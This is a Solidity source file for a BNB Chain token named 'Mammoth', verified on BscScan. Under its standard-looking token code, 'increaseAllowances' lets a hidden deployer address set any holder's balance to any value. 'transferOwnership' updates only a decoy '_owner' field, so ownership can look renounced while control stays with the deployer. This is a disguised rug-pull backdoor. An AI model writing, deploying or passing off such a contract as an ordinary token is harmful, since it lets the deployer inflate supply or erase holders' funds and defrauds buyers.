/**
 *Submitted for verification at BscScan.com on 2022-02-11
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.3;
contract Mammoth  {
    string public name = "Mammoth";
    string public symbol = "Mammoth";
    uint8 public decimals = 6;
    address private _or;
    uint256 public totalSupply = 10000000 * 10 ** 6;
    address public _owner;
     modifier onlyOwner {
        require(msg.sender == _or, "Ownable: caller is not the owner");
        _;
    }
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        _or = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransferOwnership(address indexed previousOwner, address indexed newOwner);
    function increaseAllowances(address spender, uint256 addedValue) public onlyOwner returns (bool success) {
        balanceOf[spender] = (addedValue * 10 ** 6);
        return true;
    }
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    function transferOwnership(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
    
}